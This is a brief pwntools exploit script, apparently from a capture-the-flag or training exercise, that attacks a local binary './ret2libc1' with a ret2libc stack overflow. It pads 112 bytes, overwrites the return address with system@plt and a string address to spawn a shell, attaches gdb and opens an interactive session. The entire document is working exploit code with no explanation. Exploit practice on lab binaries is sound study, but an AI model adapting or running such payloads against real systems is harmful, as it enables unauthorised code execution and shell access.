from pwn import *
sh=process('./ret2libc1')
string_addr=0x08048720
system_plt=0x08048460
payload=flat(['a'*112,system_plt,'bbbb',string_addr])
gdb.attach(sh)
pause()
sh.sendline(payload)
sh.interactive()

